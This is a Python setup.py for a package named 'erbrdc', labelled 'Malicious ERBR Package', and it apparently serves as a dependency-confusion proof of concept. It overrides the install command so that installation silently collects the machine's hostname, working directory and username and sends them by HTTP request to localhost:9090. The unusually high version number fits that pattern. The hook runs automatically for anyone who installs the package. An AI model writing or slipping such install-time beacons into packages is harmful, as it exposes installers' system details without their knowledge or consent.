from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os

class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("http://localhost:9090",params = ploads)

setup(
    name='erbrdc',
    packages=['erbrdc'],
    description='Malicious ERBR Package',
    version='100.2',
    author='BONFIM Kaio',
    cmdclass={'install': CustomInstall}
    )